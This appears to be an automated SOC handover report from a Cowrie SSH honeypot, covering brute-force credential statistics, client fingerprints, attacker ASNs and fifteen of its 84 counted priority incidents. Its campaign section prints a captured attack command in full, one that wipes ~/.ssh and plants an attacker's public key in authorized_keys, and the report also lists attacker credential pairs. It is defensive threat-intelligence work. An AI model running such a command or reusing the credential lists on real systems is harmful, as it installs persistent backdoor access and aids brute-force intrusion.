# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-20 |
| **Generated At** | 2026-08-20T12:56:26Z |
| **Shift Time** | 12:56 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **191** |
| Confirmed Threats | **181** |
| False Positives Filtered | **10** (5.2%) |
| Unique Attacker IPs | **60** |
| Countries of Origin | **26** |
| High Severity Cases | **84** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **107** |
| Malware Samples Analyzed | **2** HIGH · **22** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **104** |
| Unique Credential Pairs | **68** |
| Unique Usernames | **16** |
| Unique Passwords | **68** |
| Successful Auth Pairs | **89** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 41 |
| `ubuntu` | 11 |
| `ubnt` | 10 |
| `operator` | 5 |
| `default` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `ubnt123456` | 6 |
| `123123123` | 5 |
| `default2001` | 5 |
| `support` | 4 |
| `ubnt2010` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `ubnt` | `ubnt123456` | 6 |
| `operator` | `123123123` | 5 |
| `default` | `default2001` | 5 |
| `support` | `support` | 4 |
| `ubnt` | `ubnt2010` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `princess` | `217.60.240.161` | 2026-08-20T08:56:55 |
| `root` | `master` | `217.60.240.161` | 2026-08-20T08:56:57 |
| `root` | `hello` | `217.60.240.161` | 2026-08-20T08:56:59 |
| `root` | `charlie` | `217.60.240.161` | 2026-08-20T08:57:00 |
| `root` | `888888` | `217.60.240.161` | 2026-08-20T08:57:03 |
| `root` | `22` | `217.60.240.161` | 2026-08-20T08:57:05 |
| `root` | `superman` | `217.60.240.161` | 2026-08-20T08:57:07 |
| `root` | `michael` | `217.60.240.161` | 2026-08-20T08:57:10 |
| `root` | `696969` | `217.60.240.161` | 2026-08-20T08:57:13 |
| `root` | `qwertyuiop` | `217.60.240.161` | 2026-08-20T08:57:14 |
| `root` | `hottie` | `217.60.240.161` | 2026-08-20T08:57:16 |
| `root` | `freedom` | `217.60.240.161` | 2026-08-20T08:57:17 |
| `root` | `aa123456` | `217.60.240.161` | 2026-08-20T08:57:19 |
| `root` | `23` | `217.60.240.161` | 2026-08-20T08:57:22 |
| `root` | `qazwsx` | `217.60.240.161` | 2026-08-20T08:57:23 |
| `root` | `ninja` | `217.60.240.161` | 2026-08-20T08:57:24 |
| `root` | `azerty` | `217.60.240.161` | 2026-08-20T08:57:26 |
| `root` | `123123` | `217.60.240.161` | 2026-08-20T08:57:27 |
| `root` | `solo` | `217.60.240.161` | 2026-08-20T08:57:28 |
| `root` | `loveme` | `217.60.240.161` | 2026-08-20T08:57:30 |
| `root` | `whatever` | `217.60.240.161` | 2026-08-20T08:57:31 |
| `root` | `donald` | `217.60.240.161` | 2026-08-20T08:57:32 |
| `root` | `dragon` | `217.60.240.161` | 2026-08-20T08:57:34 |
| `operator` | `123123123` | `10.0.0.73` | 2026-08-20T08:59:43 |
| `nobody` | `nobody2010` | `31.173.2.182` | 2026-08-20T09:01:57 |
| `root` | `987` | `217.60.255.130` | 2026-08-20T09:02:15 |
| `ubuntu` | `Ali@1362` | `217.60.255.130` | 2026-08-20T09:05:33 |
| `unknown` | `unknown2003` | `14.54.22.11` | 2026-08-20T09:09:16 |
| `debian` | `temppwd` | `10.0.0.73` | 2026-08-20T09:09:53 |
| `root` | `1004` | `217.60.255.130` | 2026-08-20T09:13:01 |
| `user` | `user2012` | `111.39.167.59` | 2026-08-20T09:14:23 |
| `ubuntu` | `Mm123456@` | `217.60.255.130` | 2026-08-20T09:16:30 |
| `debian` | `debian2014` | `10.0.0.73` | 2026-08-20T09:17:59 |
| `operator` | `123123123` | `103.171.39.147` | 2026-08-20T09:18:11 |
| `operator` | `123123123` | `183.167.234.154` | 2026-08-20T09:18:23 |
| `operator` | `123123123` | `220.180.166.214` | 2026-08-20T09:18:25 |
| `root` | `1020` | `217.60.255.130` | 2026-08-20T09:23:52 |
| `support` | `support` | `10.0.0.73` | 2026-08-20T09:24:32 |
| `ubuntu` | `Lab@2024` | `217.60.255.130` | 2026-08-20T09:27:18 |
| `ubnt` | `ubnt123456` | `10.0.0.73` | 2026-08-20T09:33:26 |
| `root` | `1030` | `217.60.255.130` | 2026-08-20T09:34:13 |
| `ubuntu` | `dev1234` | `217.60.255.130` | 2026-08-20T09:38:05 |
| `user` | `user2012` | `182.156.80.11` | 2026-08-20T09:42:50 |
| `root` | `1111` | `217.60.255.130` | 2026-08-20T09:44:53 |
| `ubnt` | `ubnt2010` | `181.212.174.166` | 2026-08-20T09:47:45 |
| `ubnt` | `ubnt2010` | `63.135.169.175` | 2026-08-20T09:47:58 |
| `ubuntu` | `Hh123456` | `217.60.255.130` | 2026-08-20T09:48:55 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-20T09:51:10 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-20T09:51:10 |
| `ubnt` | `ubnt123456` | `122.117.30.20` | 2026-08-20T09:51:39 |
| `ubnt` | `ubnt123456` | `182.42.113.10` | 2026-08-20T09:51:50 |
| `config` | `config2011` | `10.0.0.73` | 2026-08-20T09:51:50 |
| `ubnt` | `ubnt123456` | `61.169.54.150` | 2026-08-20T09:51:53 |
| `ubnt` | `ubnt123456` | `41.220.3.101` | 2026-08-20T09:52:06 |
| `root` | `ubuntu` | `89.126.222.163` | 2026-08-20T09:54:57 |
| `root` | `1122` | `217.60.255.130` | 2026-08-20T09:55:38 |
| `ubnt` | `ubnt2010` | `10.0.0.73` | 2026-08-20T09:59:01 |
| `ubuntu` | `@dmin123` | `217.60.255.130` | 2026-08-20T09:59:48 |
| `support` | `support` | `176.53.159.196` | 2026-08-20T10:05:31 |
| `root` | `1124` | `217.60.255.130` | 2026-08-20T10:06:24 |
| `supervisor` | `1q2w3e` | `10.0.0.73` | 2026-08-20T10:07:08 |
| `config` | `config2011` | `121.202.138.181` | 2026-08-20T10:09:17 |
| `config` | `config2011` | `83.166.50.15` | 2026-08-20T10:09:31 |
| `ubuntu` | `It@123` | `217.60.255.130` | 2026-08-20T10:10:39 |
| `root` | `1144` | `217.60.255.130` | 2026-08-20T10:17:11 |
| `lzq` | `lzq` | `189.167.213.64` | 2026-08-20T10:18:05 |
| `345gs5662d34` | `345gs5662d34` | `189.167.213.64` | 2026-08-20T10:18:08 |
| `lzq` | `3245gs5662d34` | `189.167.213.64` | 2026-08-20T10:18:08 |
| `guest` | `guest2023` | `124.239.129.2` | 2026-08-20T10:21:00 |
| `guest` | `guest2023` | `178.178.222.59` | 2026-08-20T10:21:08 |
| `ubuntu` | `The@123` | `217.60.255.130` | 2026-08-20T10:21:43 |
| `supervisor` | `1q2w3e` | `36.93.154.207` | 2026-08-20T10:24:59 |
| `supervisor` | `1q2w3e` | `187.115.144.103` | 2026-08-20T10:25:15 |
| `default` | `default2001` | `10.0.0.73` | 2026-08-20T10:25:21 |
| `default` | `default2001` | `221.120.57.125` | 2026-08-20T10:26:58 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2223` | `66.228.53.4` | 2026-08-20T10:27:14 |
| `root` | `1199` | `217.60.255.130` | 2026-08-20T10:28:05 |
| `ubuntu` | `Of@123` | `217.60.255.130` | 2026-08-20T10:32:43 |
| `root` | `1212` | `217.60.255.130` | 2026-08-20T10:38:56 |
| `unknown` | `qwerty1234` | `10.0.0.73` | 2026-08-20T10:40:02 |
| `default` | `default2001` | `201.63.52.54` | 2026-08-20T10:42:44 |
| `default` | `default2001` | `65.20.133.56` | 2026-08-20T10:42:53 |
| `ubuntu` | `Abcde@123456` | `217.60.255.130` | 2026-08-20T10:43:50 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `216.218.206.66` | 2026-08-20T10:47:32 |
| `guest` | `guest2023` | `14.99.61.248` | 2026-08-20T10:49:05 |
| `root` | `1230` | `217.60.255.130` | 2026-08-20T10:49:56 |
| `nobody` | `nobody123` | `203.192.211.180` | 2026-08-20T10:54:17 |
| `nobody` | `nobody123` | `195.222.57.190` | 2026-08-20T10:54:25 |
| `ubuntu` | `Flash@123` | `217.60.255.130` | 2026-08-20T10:54:54 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **191** |
| Sessions with Fingerprint | **10** |
| Unique HASSH Fingerprints | **10** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 30 |
| Go SSH scanner | 28 |
| OpenSSH | 26 |
| Paramiko (Python) | 4 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 26 | 26 |
| `16443846184e...` | Generic scanner | 25 | 1 |
| `419da4c91ddb...` | Modern SSH client | 22 | 1 |
| `a2de0f306611...` | Mirai/variant | 4 | 1 |
| `f555226df196...` | Mirai/variant | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 26 | 26 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 25 | 1 | Generic scanner |
| `419da4c91ddb...` | libssh | 22 | 1 | Modern SSH client |
| `95420f9d932d...` | libssh | 5 | 2 | — |
| `a2de0f306611...` | Paramiko (Python) | 4 | 1 | Mirai/variant |
| `f555226df196...` | libssh | 3 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `98ddc5604ef6...` | Go SSH scanner | 1 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `189.167.213.64`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **60** |
| Unique ASNs | **50** |
| High-Risk ASNs | **45** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS63949` | Akamai Connected Cloud | 3 | HIGH |
| `AS398324` | Censys, Inc. | 3 | HIGH |
| `AS45820` | Tata Teleservices ISP AS | 2 | HIGH |
| `AS25159` | PJSC MegaFon | 2 | HIGH |
| `AS3301` | Telia Company AB | 2 | HIGH |
| `AS6939` | Hurricane Electric LLC | 2 | HIGH |
| `AS16629` | CTC. CORP S.A. (TELEFONICA EMPRESAS) | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (84)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-089ae176af67

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 08:56 |
| **Last Seen** | 2026-08-20 08:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:56:55` | `cowrie.session.connect` |
| `2026-08-20 08:56:55` | `cowrie.client.version` |
| `2026-08-20 08:56:55` | `cowrie.client.kex` |
| `2026-08-20 08:56:55` | `cowrie.login.success` |
| `2026-08-20 08:56:56` | `cowrie.session.params` |
| `2026-08-20 08:56:56` | `cowrie.command.input` |
| `2026-08-20 08:56:56` | `cowrie.log.closed` |
| `2026-08-20 08:56:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4ac82b8f4c0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 08:56 |
| **Last Seen** | 2026-08-20 08:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:56:56` | `cowrie.session.connect` |
| `2026-08-20 08:56:56` | `cowrie.client.version` |
| `2026-08-20 08:56:57` | `cowrie.client.kex` |
| `2026-08-20 08:56:57` | `cowrie.login.success` |
| `2026-08-20 08:56:58` | `cowrie.session.params` |
| `2026-08-20 08:56:58` | `cowrie.command.input` |
| `2026-08-20 08:56:58` | `cowrie.log.closed` |
| `2026-08-20 08:56:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a009ec2ca10a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 08:56 |
| **Last Seen** | 2026-08-20 08:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:56:58` | `cowrie.session.connect` |
| `2026-08-20 08:56:58` | `cowrie.client.version` |
| `2026-08-20 08:56:58` | `cowrie.client.kex` |
| `2026-08-20 08:56:59` | `cowrie.login.success` |
| `2026-08-20 08:56:59` | `cowrie.session.params` |
| `2026-08-20 08:56:59` | `cowrie.command.input` |
| `2026-08-20 08:56:59` | `cowrie.log.closed` |
| `2026-08-20 08:56:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39493a94f83e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 08:56 |
| **Last Seen** | 2026-08-20 08:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:56:59` | `cowrie.session.connect` |
| `2026-08-20 08:56:59` | `cowrie.client.version` |
| `2026-08-20 08:57:00` | `cowrie.client.kex` |
| `2026-08-20 08:57:00` | `cowrie.login.success` |
| `2026-08-20 08:57:01` | `cowrie.session.params` |
| `2026-08-20 08:57:01` | `cowrie.command.input` |
| `2026-08-20 08:57:01` | `cowrie.log.closed` |
| `2026-08-20 08:57:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fa53c13910e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 08:57 |
| **Last Seen** | 2026-08-20 08:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:57:02` | `cowrie.session.connect` |
| `2026-08-20 08:57:02` | `cowrie.client.version` |
| `2026-08-20 08:57:02` | `cowrie.client.kex` |
| `2026-08-20 08:57:03` | `cowrie.login.success` |
| `2026-08-20 08:57:04` | `cowrie.session.params` |
| `2026-08-20 08:57:04` | `cowrie.command.input` |
| `2026-08-20 08:57:04` | `cowrie.log.closed` |
| `2026-08-20 08:57:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7cfdd6aa9a4

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 08:57 |
| **Last Seen** | 2026-08-20 08:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:57:04` | `cowrie.session.connect` |
| `2026-08-20 08:57:04` | `cowrie.client.version` |
| `2026-08-20 08:57:04` | `cowrie.client.kex` |
| `2026-08-20 08:57:05` | `cowrie.login.success` |
| `2026-08-20 08:57:06` | `cowrie.session.params` |
| `2026-08-20 08:57:06` | `cowrie.command.input` |
| `2026-08-20 08:57:06` | `cowrie.log.closed` |
| `2026-08-20 08:57:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f30418f0066c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 08:57 |
| **Last Seen** | 2026-08-20 08:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:57:06` | `cowrie.session.connect` |
| `2026-08-20 08:57:06` | `cowrie.client.version` |
| `2026-08-20 08:57:06` | `cowrie.client.kex` |
| `2026-08-20 08:57:07` | `cowrie.login.success` |
| `2026-08-20 08:57:08` | `cowrie.session.params` |
| `2026-08-20 08:57:08` | `cowrie.command.input` |
| `2026-08-20 08:57:09` | `cowrie.log.closed` |
| `2026-08-20 08:57:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-213a293e7a4c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 08:57 |
| **Last Seen** | 2026-08-20 08:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:57:09` | `cowrie.session.connect` |
| `2026-08-20 08:57:09` | `cowrie.client.version` |
| `2026-08-20 08:57:09` | `cowrie.client.kex` |
| `2026-08-20 08:57:10` | `cowrie.login.success` |
| `2026-08-20 08:57:10` | `cowrie.session.params` |
| `2026-08-20 08:57:10` | `cowrie.command.input` |
| `2026-08-20 08:57:11` | `cowrie.log.closed` |
| `2026-08-20 08:57:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b522e16cd805

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 08:57 |
| **Last Seen** | 2026-08-20 08:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:57:11` | `cowrie.session.connect` |
| `2026-08-20 08:57:11` | `cowrie.client.version` |
| `2026-08-20 08:57:11` | `cowrie.client.kex` |
| `2026-08-20 08:57:11` | `cowrie.login.success` |
| `2026-08-20 08:57:12` | `cowrie.session.params` |
| `2026-08-20 08:57:12` | `cowrie.command.input` |
| `2026-08-20 08:57:12` | `cowrie.log.closed` |
| `2026-08-20 08:57:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d7fc2cba8cc

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 08:57 |
| **Last Seen** | 2026-08-20 08:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:57:12` | `cowrie.session.connect` |
| `2026-08-20 08:57:12` | `cowrie.client.version` |
| `2026-08-20 08:57:12` | `cowrie.client.kex` |
| `2026-08-20 08:57:13` | `cowrie.login.success` |
| `2026-08-20 08:57:14` | `cowrie.session.params` |
| `2026-08-20 08:57:14` | `cowrie.command.input` |
| `2026-08-20 08:57:14` | `cowrie.log.closed` |
| `2026-08-20 08:57:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46fcacabf6d2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 08:57 |
| **Last Seen** | 2026-08-20 08:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:57:14` | `cowrie.session.connect` |
| `2026-08-20 08:57:14` | `cowrie.client.version` |
| `2026-08-20 08:57:14` | `cowrie.client.kex` |
| `2026-08-20 08:57:14` | `cowrie.login.success` |
| `2026-08-20 08:57:15` | `cowrie.session.params` |
| `2026-08-20 08:57:15` | `cowrie.command.input` |
| `2026-08-20 08:57:15` | `cowrie.log.closed` |
| `2026-08-20 08:57:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-521da2914f69

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 08:57 |
| **Last Seen** | 2026-08-20 08:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:57:15` | `cowrie.session.connect` |
| `2026-08-20 08:57:15` | `cowrie.client.version` |
| `2026-08-20 08:57:15` | `cowrie.client.kex` |
| `2026-08-20 08:57:16` | `cowrie.login.success` |
| `2026-08-20 08:57:17` | `cowrie.session.params` |
| `2026-08-20 08:57:17` | `cowrie.command.input` |
| `2026-08-20 08:57:17` | `cowrie.log.closed` |
| `2026-08-20 08:57:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f44f86e43b5

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 08:57 |
| **Last Seen** | 2026-08-20 08:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:57:17` | `cowrie.session.connect` |
| `2026-08-20 08:57:17` | `cowrie.client.version` |
| `2026-08-20 08:57:17` | `cowrie.client.kex` |
| `2026-08-20 08:57:17` | `cowrie.login.success` |
| `2026-08-20 08:57:18` | `cowrie.session.params` |
| `2026-08-20 08:57:18` | `cowrie.command.input` |
| `2026-08-20 08:57:18` | `cowrie.log.closed` |
| `2026-08-20 08:57:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55f14ad4fc46

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 08:57 |
| **Last Seen** | 2026-08-20 08:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:57:18` | `cowrie.session.connect` |
| `2026-08-20 08:57:18` | `cowrie.client.version` |
| `2026-08-20 08:57:18` | `cowrie.client.kex` |
| `2026-08-20 08:57:19` | `cowrie.login.success` |
| `2026-08-20 08:57:19` | `cowrie.session.params` |
| `2026-08-20 08:57:19` | `cowrie.command.input` |
| `2026-08-20 08:57:20` | `cowrie.log.closed` |
| `2026-08-20 08:57:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88278d45b2d1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 08:57 |
| **Last Seen** | 2026-08-20 08:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:57:20` | `cowrie.session.connect` |
| `2026-08-20 08:57:20` | `cowrie.client.version` |
| `2026-08-20 08:57:20` | `cowrie.client.kex` |
| `2026-08-20 08:57:20` | `cowrie.login.success` |
| `2026-08-20 08:57:21` | `cowrie.session.params` |
| `2026-08-20 08:57:21` | `cowrie.command.input` |
| `2026-08-20 08:57:21` | `cowrie.log.closed` |
| `2026-08-20 08:57:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

